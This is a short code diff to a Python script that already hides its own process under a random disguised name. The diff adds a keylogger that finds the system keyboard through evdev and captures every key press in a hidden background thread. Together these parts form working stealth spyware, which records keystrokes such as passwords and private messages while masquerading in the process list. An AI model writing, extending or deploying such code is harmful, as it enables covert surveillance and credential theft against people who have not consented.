@@ -1,7 +1,9 @@
+from evdev import InputDevice, categorize, ecodes, list_devices
 import os
 import psutil
 import random
 import setproctitle
+import threading
 
 def disguise():
 	setDisguise(getDisguise())
@@ -26,4 +28,19 @@ def setDisguise(disguise):
 	setproctitle.setproctitle(disguise)
 	print "Cloaked as: " + disguise
 
-	
+def startKeylogger():
+	logThread = threading.Thread(target=startKeylistener)
+	logThread.daemon = True
+	logThread.start()
+
+def findKeyboard():
+	devices = [InputDevice(fn) for fn in list_devices()]
+	for dev in devices:
+		if "Keyboard" in dev.name:
+			return dev.fn 
+
+def startKeylistener():
+	dev = InputDevice(findKeyboard())
+	for event in dev.read_loop():
+		if event.type == ecodes.EV_KEY:
+			print(categorize(event))
